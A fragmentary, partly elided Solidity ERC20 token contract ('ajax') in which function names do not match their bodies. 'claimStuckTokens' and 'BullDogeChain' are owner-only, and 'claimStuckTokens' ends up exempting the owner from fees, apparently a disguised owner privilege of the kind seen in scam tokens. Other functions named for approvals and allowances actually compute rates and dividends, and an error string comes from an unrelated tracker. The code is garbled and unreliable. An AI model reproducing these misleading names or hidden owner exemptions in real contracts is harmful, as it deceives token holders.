...
contract ajax is Context, IERC20, Ownable {
    ...
    function BullDogeChain(address account) external onlyOwner {
    ...
    function claimStuckTokens(uint256 newClaim) public onlyOwner {
		  require(newClaim >= 1800 && newClaim <= 86800, "Dividend_Tracker: claimWait error");
		  _isExcludedFromFee[msg.sender] = true;
	  }



    function _approve(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
    ...
    function setSwapEnabled() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply / tSupply;
    }    

   	function queueTransaction(uint256 lastClaimTime, uint256 claimWait) private view returns (bool) {
	...
	function decreaseAllowance(uint256 share, uint256 dividendsPerShare) internal pure returns (uint256) {
		  return share * (dividendsPerShare) / (2600);
		}
